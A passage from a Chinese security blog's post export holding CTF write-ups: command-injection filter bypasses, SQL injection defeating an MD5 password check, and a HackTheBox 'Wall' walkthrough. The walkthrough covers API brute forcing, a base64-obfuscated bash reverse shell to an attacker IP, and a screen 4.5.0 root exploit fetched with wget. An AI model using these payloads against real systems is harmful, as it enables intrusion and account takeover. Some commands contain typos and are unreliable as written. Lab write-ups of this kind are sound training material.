过滤了许多标点，空格，bash,包括flag的贪婪匹配。那么自己印象中几种做法： 12341.cat fl* 利用*匹配任意 不行2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash 也不行3.ca\\t fl\\ag.php 不行4.cat fl&#39;&#39;ag.php 不行 那么如何解决呢？其实还有一种比较常见的做法没有提及，那就是变量拼接：之前自己特别喜欢用的一句话木马拆开用也是这个道理。 正好，我们看到源码中有一个$a变量可以覆盖，那么payload就出来了： 1&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php 然后有官方与其他大佬的高端解法：官方： 1echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。 dalao内联执行的做法，只能说V&amp;N的师傅们太强了。 1http:&#x2F;&#x2F;530bbcaf-9d64-494e-8993-bb3727c31a5a.node3.buuoj.cn&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96; 内联，就是将反引号内命令的输出作为输入执行。秒题大概就是这种做法吧…… BabySqli进去后一个账号，密码输入框。先随便输下，提示wrong pass。但是看源码有意外收获从形式上看数字成分都没有超过6,可能是base32，解码后得到一个base64编码，解码后得到以下: 1select * from user where username &#x3D; &#39;$name&#39; 那么就可以在username这个注入点下手处理了。这道题目只过滤了基本的and与等号还是很能操作的。不过后来看别人说这题考点在MD5查询绕过。这么说的原因是，就算成功注入把admin密码的MD5拿到，因为解不了的缘故等于没用。基于题目提示的wrong pass，那么大概率是直接拿输入密码的MD5数值跟数据库里已知值比较。 稍微FUZZ一下admin&#39; union select 1,2,3可以确认有三个字段后面确认大概是id,admin，passwd三个字段。这里为了绕过，需要保证我们的查询结构一致，就可直接select 想要的返回值。那么构造一个为假的查询-1，后面接上联合查询： 1-1&#39; union select 1,&#39;admin&#39;,&#39;7363a0d0604902af7b70b271a0b96480&#39;# 密码输123即可","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"hackthebox-Wall","slug":"hackthebox-Wall","date":"2020-01-12T04:09:00.000Z","updated":"2021-02-18T05:09:30.192Z","comments":true,"path":"2020/01/12/hackthebox-Wall/","link":"","permalink":"https://www.bycsec.top/2020/01/12/hackthebox-Wall/","excerpt":"总算是挺过了期末12门的魔鬼考试日程，迎来了寒假……这次寒假打算学的还挺多的，也希望自己能坚持学习，把知识尽量融会贯通吧。之前曾说过希望能早日拿下自己在hackthebox上的第一台靶机，没想到这么快就在帮助下拿到手了。其实在进入期末复习阶段中的一段时间，自己就参考youtube上一位优秀的hacker youtuber关于hackthebox的视频成功拿到了靶机，只不过一直没写文章。而现在这台Wall靶机在hackthebox上也已经处于下架状态，所以我就简单记录一下拿下Wall的过程，没法贴实操图了。","text":"总算是挺过了期末12门的魔鬼考试日程，迎来了寒假……这次寒假打算学的还挺多的，也希望自己能坚持学习，把知识尽量融会贯通吧。之前曾说过希望能早日拿下自己在hackthebox上的第一台靶机，没想到这么快就在帮助下拿到手了。其实在进入期末复习阶段中的一段时间，自己就参考youtube上一位优秀的hacker youtuber关于hackthebox的视频成功拿到了靶机，只不过一直没写文章。而现在这台Wall靶机在hackthebox上也已经处于下架状态，所以我就简单记录一下拿下Wall的过程，没法贴实操图了。 参考的youtuber:IppSec https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA幸好自己英语水平过硬，可以啃他的生肉视频。感谢这位大佬，确实帮到了我很多。 本机ip:10.10.14.3(也许吧,记不得了hhh)靶机ip:10.10.10.157 然后回顾一下整个过程吧。首先第一步当然是使用hackthebox提供给我们的ovpn连接。这样我们就创建好了与靶机之间的虚拟专有网络。可以访问到题目。 之后就是面对hackthebox上一众靶机的常规套路：使用nmap进行端口扫描（这应该也是正常渗透过程中的第一步） 1namp -sC -sV -oA namp&#x2F;wall 10.10.10.157 我学习了下那位youtuber的好习惯，这里namp不仅做了扫描，同时还保存为文件方便回顾。 之后发现开放了两个端口，80与22,也就是http与ssh对应服务。尝试直接访问，也得到了apache的默认页面。基于ssh并无太多利用之处，可以直接从web页面下手。那么先扫下目录，来看看有没有什么可能有趣的,在简单的FUZZ一下robots.txt,.htacess都无结果后，果断使用gobuster： 1gobuster dir -u http:&#x2F;&#x2F;10.10.10.157&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt 扫到了一个/monitoring，尝试访问，却发现提示unauthorized。并提示输入用户密码，尝试下admin-admin,admin-password,guest-guest等等可能的弱口令无果，于是得另辟蹊径。顺便补一下webAPI中authorize跟authentication的区别： 123身份验证（Authentication）：确定用户是谁。授权(Authorization)：确定用户能做什么，不能做什么。 这里从dalao那学到了一招：抓包后，当以GET方式访问/monitoring时，我们得到的是401 unauthorized,但如果以POST方式访问，就会的到页面提示，并拿到后续操作的页面目录 /centreon 再度访问，终于得到一个centreon的登录界面，同时版本为19.04.0那么问题就回到用户密码上了。为了能了解这一系统，当然需要谷歌了解下centreon到底为何物，以及有什么可以利用的。很快就可以发现，这一版本存在有sql注入，RCE命令执行等等漏洞；或者使用kali上的searchspolit centreon```12发现有RCE等等漏洞以及利用，我们对RCEgetshell相对比较轻松，那么就不妨看看RCE的利用&#96;&#96;&#96; searchsploit -x &quot;此处接利用的脚本文件地址&quot; 仔细审过后发现，从上面提到的种种漏洞到现在具体的RCE，我们都需要在autheticated的前提下利用，那么还是得从登陆界面的用户密码下手。 这里又从大佬那学到了第二招：在登录界面随便输入尝试登录并抓包时，会发现burp抓包得内容除了admin,password参数，还会有centreon自带的token。这就给我们的暴力破解可能性画上了句号。那么还有其他方法爆破吗？有的，通过API来尝试： google后发现确实存在centreon的api,而且确实只传了username,password两个参数，是可以爆破的。之后继续FUZZ，于是准备post访问： 1&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate 并顺便传参admin=admin&amp;password=passowrd。发现返回bad crendentials。并且改掉username参数时返回的是一致的，这样就不好通过response来爆破。那只能猜测用户名是admin了。 1wfuzz http:&#x2F;&#x2F;10.10.10.157&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate -w &#x2F;usr&#x2F;share&#x2F;seclist&#x2F;Passwords&#x2F;darkweb2017-top1000.txt -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; --hc 403 –hc 可以筛掉返回403的结果。上面用的这个字典我好像kali上并没有，只能自己找字典用了。很快得到正确的密码 password1……这个弱口令真的是强，简单归简单，总归人手FUZZ应该不太能FUZZ出来…… 之后就成功登陆，轮到我们大展身手了。在网上可以查到很多种利用，我参考了dalao的那种命令执行（像这种控制台里的确存在很多可以注入利用的地方）在centreon的configuration中可以进行命令执行,简单试下 1ping -c 1 127.0.0.1; linux的ping貌似与windows有区别。然而在命令执行时失败了并返回403。继续尝试其他的发现可能是过滤了空格。于是使用常见的一种绕过手段：${IFS}绕过空格。另外，我还学到了有别于自己原来垃圾的把空格一个个换成${IFS}的手段。直接在linux命令行中 1echo &#39;ping -c 1 127.0.0.1;&#39;|sed &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39; 就得到了payload ,再度放在刚刚的命令执行空格中，保存，并export configuration以执行命令。发现成功了。既然测试好了，那我们就直接getshell吧。原payload: 1bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39; 这里bash -c 是直接将后面的字符串内容执行命令。而后面bash -i等等就是bash反弹shell的命令了。(这里自己其实自学了好久，也折腾了不晒时间才成功在kali上拿到自己的一台公网vps的shell，之后如果写学习笔记再详细解释理解下)这里不妨用base64编码下绕检查,我也不记得这里不用base64编码是否会产生被过滤bash的问题，但毕竟bash是高危命令，还是执行编码为妙。 1echo &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39; &quot;|base 64 得到： 1YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D; 那么绕过空格： 1echo &quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D; | base4 -d | bash&quot; |sed &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39; 现payload: 1echo$&#123;IFS&#125;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;$&#123;IFS&#125;|$&#123;IFS&#125;base4$&#123;IFS&#125;-d$&#123;IFS&#125;|$&#123;IFS&#125;bash; 记得最后要有分号。之后在自己kali上监听8888端口： 1nc -lvp 8888 命令执行即可getshell。 拿 user 权限hackthebox的靶机拿下，并不只是简单的getshell,而是要分别拿到root权限与user权限下的两个文件中的flag提交才算成功。这里自己因为没什么提权经验，很大程度上参考了不少wp与视频才算成功。先从简单的user开始： 1ls -la 发现user有shelby与sysmonitor两个。找一下shelby的内容后发现只有shelby有权限读user.txt即flag。经过一番挖掘，可以发现能够找到/opt/.shelby/backup这一文件。file backup后发现是一个python编译文件，可能就是pyc吧。执行下python backup这时我们如果再ls -la，就会发现我们不知怎么已经完成了authentication。进入目录。 1base64 backup 将结果在本机的vim保存为backup.pyc.b64，再base64解码，这样这样一个pyc文件就算到了本机了。然后我们用python 的uncompyle库反编译一下。还原了py文件。从其中直接拿到shelby 的密码 ShelbyPassw@rdIsStrong!ssh登录shelby即可读user.txt。 拿 root 权限拿root权限时我就比较尴尬了，因为这里root的payload可以直接拿到root跟shelby二者的权限。参考了一个解法： /bin/screen-4.5.0For this exact version there is a vulnerability that allows to escalate to root 这里/bin下的screen版本允许我们直接利用漏洞拿到root权限。payload在此：https://github.com/XiphosResearch/exploits/tree/master/screen2root那接下来只用把脚本放到我们拿到shell的机子执行screenroot.sh即可。那么如何传输文件呢？这里运用到了python强大的功能，也是自己之前曾用过的SimpleHTTPServer 1python -m SimpliHTTPServer 这样就默认监听8000端口了，先把脚本放在根目录。尝试curl 10.10.14.3:8000/screenroot.sh失败,没有安装curl。再尝试wget 10.10.14.3:8000/screenroot.sh成功，在靶机shell拿到脚本。 1bash screenroot.sh 运行成功，进入shell的交互页面。cat /root/root.txt即可，还可以cat /home/shelby/user.txt拿到之前的userflag。 大抵如此吧。当时即使在参考，自己也花了不少时间在getshell后的提权上，看来自己还要再多加了解学习呀。寒假已经开始，我也争取再拼一把，多学一些web方面的知识吧。","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]}],"categories":[],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.bycsec.top/tags/Go/"},{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"redis","slug":"redis","permalink":"https://www.bycsec.top/tags/redis/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"Linux","slug":"Linux","permalink":"https://www.bycsec.top/tags/Linux/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"javascript","slug":"javascript","permalink":"https://www.bycsec.top/tags/javascript/"},{"name":"Node.js","slug":"Node-js","permalink":"https://www.bycsec.top/tags/Node-js/"},{"name":"windows","slug":"windows","permalink":"https://www.bycsec.top/tags/windows/"}]}